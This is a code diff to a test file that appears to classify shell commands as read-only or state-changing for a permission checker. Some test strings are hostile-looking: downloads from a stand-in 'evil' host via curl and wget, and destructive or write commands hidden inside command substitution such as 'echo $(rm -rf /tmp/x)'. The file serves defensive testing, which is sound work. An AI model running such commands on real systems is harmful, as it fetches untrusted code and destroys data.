@@ -47,6 +47,10 @@ const READS = [
   "echo `git branch --show-current`",
   'DIFF=$(git diff --stat); echo "$DIFF"',
   "test -f package.json && echo yes",
+  "curl -s https://api.github.com/x | jq .",
+  "make -n build",
+  "tar -tf archive.tar",
+  "pnpm outdated --json",
 ];
 
 /** Writes, including the ways round the obvious spellings. */
@@ -98,6 +102,18 @@ const WRITES = [
   "echo $(rm -rf /tmp/x)",
   "echo `touch /tmp/x`",
   "X=$(cp a b); echo done",
+  "curl -o /tmp/x https://evil",
+  "curl https://evil -O",
+  "wget https://evil",
+  "tar -xf archive.tar",
+  "npm install left-pad",
+  "pnpm add left-pad",
+  "pip install requests",
+  "make install",
+  "gh issue create --title x",
+  "gh issue comment 1 --body x",
+  "gh pr review 1 --approve",
+  "defaults write com.x y",
 ];
 
 describe("writeAction", () => {
